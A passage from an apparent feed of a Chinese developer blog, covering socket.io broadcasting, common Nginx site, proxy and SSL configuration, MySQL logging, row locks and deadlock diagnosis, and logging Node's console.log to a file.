&#123;</span><br><span class="line">   console.log(&#39;A user connected&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      console.log(&#39;A user disconnected&#39;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>现在再次访问<code>http://localhost:3000</code>，不仅可以在浏览器中看见<code>hello world</code>，如果刷新浏览器，还能在控制台中看见以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A user connected</span><br><span class="line">A user disconnected</span><br><span class="line">A user connected</span><br></pre></td></tr></table></figure><p>在上面的案例中，我们使用了<code>socket.io</code>的<code>connection</code>和<code>disconnect</code>事件，<code>socket.io</code>还有很多其中事件。 </p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>在服务端中有以下是保留字：</p><ul><li>Connect</li><li>Message</li><li>Disconnect</li><li>Reconnect</li><li>Ping</li><li>Join and</li><li>Leave</li></ul><p>在客户端中以下是保留字：</p><ul><li>Connect</li><li>Connect_error</li><li>Connect_timeout</li><li>Reconnect, etc</li></ul><h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>客户端 提供的一些用于处理错误/异常的API。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Connect − When the client successfully connects.</span><br><span class="line"></span><br><span class="line">Connecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Disconnect − When the client is disconnected.</span><br><span class="line"></span><br><span class="line">Connect_failed − When the connection to the server fails.</span><br><span class="line"></span><br><span class="line">Error − An error event is sent from the server.</span><br><span class="line"></span><br><span class="line">Message − When the server sends a message using the send function.</span><br><span class="line"></span><br><span class="line">Reconnect − When reconnection to the server is successful.</span><br><span class="line"></span><br><span class="line">Reconnecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Reconnect_failed − When the reconnection attempt fails.</span><br></pre></td></tr></table></figure><h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>广播意味着向所有连接的客户端发送消息。</p><p>要向所有客户端广播事件，我们可以使用<code>io.sockets.emit</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">var clients &#x3D; 0;</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   clients++;</span><br><span class="line">   io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      clients--;</span><br><span class="line">      io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>广播在<code>socket.io</code>中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">      socket.on(&#39;broadcast&#39;,function(data) &#123;</span><br><span class="line">         document.body.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">         document.write(data.description);</span><br><span class="line">      &#125;);</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>可以尝试打开多个浏览器，输入<code>http://localhost:3000</code>，可能会得到以下结果：</p><p><img src="https://www.tutorialspoint.com/socket.io/images/broadcast_to_all.jpg" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tutorialspoint.com/socket.io/index.htm" target="_blank" rel="noopener">Socket.io Tutorial</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用&lt;code&gt;socket.io&lt;/code&gt; 和 &lt;code&gt;redis&lt;/code&gt; 完成了一些小功能，觉得很实用，所以整理一下&lt;code&gt;socket.io&lt;/code&gt;相关的知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Node" scheme="https://www.0x2beace.com/categories/Node/"/>
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/categories/Node/Socket-io/"/>
    
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/tags/Socket-io/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 常见配置</title>
    <link href="https://www.0x2beace.com/nginx-common-configuration/"/>
    <id>https://www.0x2beace.com/nginx-common-configuration/</id>
    <published>2020-07-19T10:22:26.000Z</published>
    <updated>2020-07-19T10:24:25.144Z</updated>
    
    <content type="html"><![CDATA[<p>最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。</p><a id="more"></a><h2 id="多站点配置"><a href="#多站点配置" class="headerlink" title="多站点配置"></a>多站点配置</h2><p>如果一台服务器，需要配置多套站点，推荐使用 <code>IP + 端口</code>配置站点，然后使用反向代理指向端口。</p><p>站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       40001;</span><br><span class="line">    </span><br><span class="line">    location ~ \.php &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 站点1 </span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 站点2</span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><p>申请好证书之后，将其放在服务器上，然后编辑Nginx 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name  yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem;  &#x2F;&#x2F; 证书所在路径</span><br><span class="line">    ssl_certificate_key ssl_0123cp_net&#x2F;private.key;  &#x2F;&#x2F; 证书对应的私钥所在路径</span><br><span class="line">  </span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">        index  index.html index.htm index.jsp index.js;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="http重定向"><a href="#http重定向" class="headerlink" title="http重定向"></a>http重定向</h2><p>配置好 <code>https</code>之后，还需要做一件事，才能保证 <code>https</code>能够正常访问。</p><p>因为访问任何一个网站时，默认使用的是<code>http</code>协议，所以需要在<code>Web Server</code>中配置<code>http</code> 自动跳转 <code>https</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 80;</span><br><span class="line">    rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。&lt;/p&gt;</summary>
    
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Mac 开启 Mysql 日志记录</title>
    <link href="https://www.0x2beace.com/mac-open-mysql-logging/"/>
    <id>https://www.0x2beace.com/mac-open-mysql-logging/</id>
    <published>2020-07-19T09:24:43.000Z</published>
    <updated>2020-07-20T05:06:44.373Z</updated>
    
    <content type="html"><![CDATA[<p>有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。</p><a id="more"></a><ol><li>进入Mysql 命令行</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -uroot -p</span><br></pre></td></tr></table></figure><ol start="2"><li>全局开启普通日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看Mysql 日志文件所在目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719172134.png" alt=""></p><ol start="4"><li>实时查看日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f &#x2F;your_mysql_log_file_path</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 行锁原因分析</title>
    <link href="https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/"/>
    <id>https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/</id>
    <published>2020-07-19T09:03:04.000Z</published>
    <updated>2020-07-19T09:11:47.872Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。</p><a id="more"></a><h1 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h1><p>MySQL有三种锁的级别：页级、表级、行级。</p><ul><li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。</li><li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。</li><li>页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</li></ul><p>因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。</p><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h2><p>InnoDB实现了两种类型的行锁:</p><ul><li>共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</li><li>排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</li></ul><blockquote><p>所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁</p></blockquote><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><ol><li>首先创建一个 <code>InnoDB</code>类型的数据表，SQL 如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;gap&#96; (</span><br><span class="line">  &#96;id&#96; int(11) DEFAULT NULL,</span><br><span class="line">  KEY &#96;ind_gap_id&#96; (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建会话1，开启事务A并执行update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 30 where id &#x3D; 33;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建会话2，开启事务B并执行另一个update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 22 where id &#x3D; 20;</span><br></pre></td></tr></table></figure><p>在会话2中 插入<code>20 &gt; id &lt; 39</code>范围外的值时 可以执行成功,而当要插入 <code>[20,39)</code>范围内的值时 会遇到gap lock 。</p><ol start="4"><li>用会话1 查看当前正在进行中的事务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure></li></ol><p>不会意外，能看到下面两条记录：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p>这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 <code>next-key lock</code> ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 <code>[20,39)</code>。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种：</p><ol><li>改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。</li><li>如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/rainy-shurun/p/5166163.html" target="_blank" rel="noopener">Mysql 死锁原因分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 查看死锁和解除死锁</title>
    <link href="https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/"/>
    <id>https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/</id>
    <published>2020-07-19T08:07:48.000Z</published>
    <updated>2020-07-19T09:10:18.298Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间遇到了一个Mysql 死锁相关的问题，整理一下。</p><a id="more"></a><blockquote><p>问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。</p></blockquote><p><img src="https://i.loli.net/2020/06/28/3dXRhKHQWMlearC.png" alt="image.png"></p><h3 id="什么是死锁"><a href="#什么是死锁" class="headerlink" title="什么是死锁"></a>什么是死锁</h3><p>在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。</p><p>死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。</p><h3 id="死锁的表现"><a href="#死锁的表现" class="headerlink" title="死锁的表现"></a>死锁的表现</h3><p>死锁的具体表现有两种：</p><ol><li>Mysql 增改语句无法正常生效</li><li>使用Mysql GUI 工具编辑字段的值时，会出现异常。</li></ol><h3 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h3><p>阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则：</p><p>1.尽量避免并发的执行涉及到修改数据的语句。</p><p>2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。</p><p>3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。</p><h3 id="查看死锁"><a href="#查看死锁" class="headerlink" title="查看死锁"></a>查看死锁</h3><p>Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。</p><h4 id="1-查看正在进行中的事务"><a href="#1-查看正在进行中的事务" class="headerlink" title="1. 查看正在进行中的事务"></a>1. 查看正在进行中的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX</span><br></pre></td></tr></table></figure><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><h4 id="2-查看正在锁的事务"><a href="#2-查看正在锁的事务" class="headerlink" title="2. 查看正在锁的事务"></a>2. 查看正在锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163402.png" alt=""></p><h4 id="3-查看等待锁的事务"><a href="#3-查看等待锁的事务" class="headerlink" title="3. 查看等待锁的事务"></a>3. 查看等待锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155801.png" alt=""></p><h4 id="4-查询是否锁表"><a href="#4-查询是否锁表" class="headerlink" title="4. 查询是否锁表"></a>4. 查询是否锁表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163422.png" alt=""></p><h4 id="5-查看最近死锁的日志"><a href="#5-查看最近死锁的日志" class="headerlink" title="5. 查看最近死锁的日志"></a>5. 查看最近死锁的日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719170929.png" alt=""></p><p>在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。</p><h3 id="解除死锁"><a href="#解除死锁" class="headerlink" title="解除死锁"></a>解除死锁</h3><p>如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。</p><p>查看当前正在进行中的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show processlist</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 也可以使用</span><br><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure><p>上面两个命令找出来的进程id 是同一个。</p><p>杀掉进程对应的进程 id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill id</span><br></pre></td></tr></table></figure><p>验证（kill后再看是否还有锁）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/duanxz/p/4394641.html" target="_blank" rel="noopener">Mysql 查看表和解锁表</a></li><li><a href="https://blog.csdn.net/LJFPHP/article/details/80599352" target="_blank" rel="noopener">Mysql 死锁是什么？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间遇到了一个Mysql 死锁相关的问题，整理一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>如何把 Console.log 的标准输出记录到文件</title>
    <link href="https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/"/>
    <id>https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/</id>
    <published>2020-07-18T08:16:51.000Z</published>
    <updated>2020-07-18T08:47:27.103Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把<code>console.log</code>的标准输出全部记录到文件中呢？</p><a id="more"></a><p>我是没有选择那些大名鼎鼎的日志模块，如：</p><ul><li><a href="https://github.com/winstonjs/winston" target="_blank" rel="noopener">winston</a> - A logger for just about everything.</li><li><a href="https://github.com/log4js-node/log4js-node" target="_blank" rel="noopener">log4js</a> - A port of log4js to node.js</li></ul><p>因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);</span><br><span class="line">var log_stdout &#x3D; process.stdout;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 重载console.log 函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">console.log &#x3D; function() &#123;</span><br><span class="line">    var res &#x3D; &quot;&quot;,</span><br><span class="line">    len &#x3D; arguments.length;</span><br><span class="line">    for(var i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">        res +&#x3D; arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_file.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">    log_stdout.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/8393636/node-log-in-a-file-instead-of-the-console" target="_blank" rel="noopener">Node: log in a file instead of the console</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把&lt;code&gt;console.log&lt;/code&gt;的标准输出全部记录到文件中呢？&lt;/p&gt;</summary>
    
    
    
    <category term="一些经验" scheme="https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"/>
    
    
    <category term="Node" scheme="https://www.0x2beace.com/tags/Node/"/>
    
  </entry>
  
  <entry>
    <title>解决Firefox “已阻止载入混合活动内容”</title>
    <link href="https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/"/>
    <id>https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/</id>
    <published>2020-07-18T07:15:30.000Z</published>
    <updated>2020-07-18T07:21:10.821Z</updated>
    
